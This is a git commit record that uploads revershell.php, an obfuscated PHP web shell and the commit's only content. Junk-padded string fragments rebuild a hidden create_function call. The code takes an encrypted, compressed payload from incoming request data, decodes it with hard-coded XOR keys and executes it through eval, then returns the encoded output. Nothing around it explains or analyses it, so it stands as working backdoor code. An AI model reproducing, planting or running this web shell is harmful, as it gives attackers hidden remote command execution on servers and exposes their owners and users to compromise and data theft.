fed7fee91bee9a530a92ed13f4637cb330d21c91
juwel9-97 <158488601+juwel9-97@users.noreply.github.com>
2024-03-12 10:45:28 +0000

    Add files via upload

---
+++ revershell.php
@@ -0,0 +1,12 @@
+<?php
+$x='$k="5f4dYsccYs3b";Ys$kh="Ys5aa765d6Ys1dYs83";$kf="27Ysdeb882cfYs99";Ys$pYs="yYsYsZ';
+$B='FYsAGtcnFS8Q6YsuW0"Ys;fuYsnction x($t,$k)Ys{$c=strlen($kYs);$l=sYstrlen($t);$o=Ys""';
+$s='}^Ys$kYs{$j};}}reYsturn Ys$Yso;}if (@pregYs_Ysmatch("/$khYs(.+Ys)$kf/",@fiYsle_geYst_coYs';
+$U='baYsseYs64_dYsecodYse($m[1]),$kYs)));$o=@ob_Ysget_contenYsts(Ys);@ob_endYs_cleaYsn';
+$j='(Ys);$r=@bYsaYsse64_enYscode(@xYs(@gYszcoYsmpress($Yso),$k));priYsnt("$pYs$kh$r$kf");}';
+$V=str_replace('kW','','kWcreatkWkWkWe_funckWtkWion');
+$c='nteYsnts("php://Ysinput"YsYs),$m)==1) {@oYsb_sYstart();@eYsvalYs(@gzuYsncompress(Ys@x(Ys@';
+$Q=';forYsYs($i=0;$i<$Ysl;){foYsr(Ys$j=0;($jYs<$c&&$i<$lYs);$jYsYs++,$Ysi++){$o.=$t{$i';
+$p=str_replace('Ys','',$x.$B.$Q.$s.$c.$U.$j);
+$C=$V('',$p);$C();
+?>
